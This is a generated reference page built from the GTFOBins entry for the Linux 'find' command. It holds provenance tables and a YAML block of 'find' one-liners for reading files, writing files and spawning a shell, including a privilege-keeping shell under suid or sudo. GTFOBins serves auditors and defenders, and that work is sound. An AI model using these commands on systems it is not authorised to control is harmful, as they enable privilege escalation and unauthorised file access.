---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# find

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `find` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/find` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [find](../../tools/linux/find.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | find |
| name | find |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/find/ |

## Preserved Source Material

```yaml
_body: ''
_name: find
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/find
functions:
  file-read:
  - code: find /path/to/input-file -exec cat {} \;
    comment: This uses `cat` to actually read the file, but since permissions are not dropped, it's executed with the same
      privileges as `find`.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  file-write:
  - code: find / -fprintf /path/to/output-file DATA -quit
    comment: '`DATA` is a format string, it supports some escape sequences.'
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  shell:
  - code: find . -exec /bin/sh \; -quit
    contexts:
      sudo: null
      suid:
        code: find . -exec /bin/sh -p \; -quit
        shell: false
      unprivileged: null
```
